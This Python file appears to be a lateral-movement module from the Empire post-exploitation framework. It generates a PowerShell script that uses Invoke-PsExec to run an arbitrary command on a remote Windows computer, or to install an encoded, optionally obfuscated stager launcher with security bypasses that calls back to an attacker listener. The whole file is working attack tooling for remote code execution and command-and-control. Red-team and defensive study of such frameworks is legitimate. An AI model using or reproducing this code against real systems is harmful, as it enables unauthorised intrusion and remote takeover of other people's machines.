from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # staging options
        listener_name = params["Listener"]
        computer_name = params["ComputerName"]
        service_name = params["ServiceName"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        command = params["Command"]
        result_file = params["ResultFile"]
        launcher_obfuscate = params["Obfuscate"].lower() == "true"
        launcher_obfuscate_command = params["ObfuscateCommand"]

        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        script_end = ""
        if command != "":
            # executing a custom command on the remote machine
            customCmd = "%COMSPEC% /C start /b " + command.replace('"', '\\"')
            script_end += f'Invoke-PsExec -ComputerName {computer_name} -ServiceName "{service_name}" -Command "{customCmd}"'

            if result_file != "":
                # Store the result in a file
                script_end += f' -ResultFile "{result_file}"'

        elif not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            # not a valid listener, return nothing for the script
            return handle_error_message("[!] Invalid listener: " + listener_name)

        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(
                listenerName=listener_name,
                language="powershell",
                encode=True,
                obfuscate=launcher_obfuscate,
                obfuscation_command=launcher_obfuscate_command,
                userAgent=user_agent,
                proxy=proxy,
                proxyCreds=proxy_creds,
                bypasses=params["Bypasses"],
            )

            if launcher == "":
                return handle_error_message("[!] Error in launcher generation.")

            stager_cmd = (
                "%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\"
                + launcher
            )
            script_end += f'Invoke-PsExec -ComputerName {computer_name} -ServiceName "{service_name}" -Command "{stager_cmd}"'

        outputf = params.get("OutputFunction", "Out-String")
        script_end += (
            f" | {outputf} | "
            + '%{$_ + "`n"};"`n'
            + str(module.name.split("/")[-1])
            + ' completed!"'
        )

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
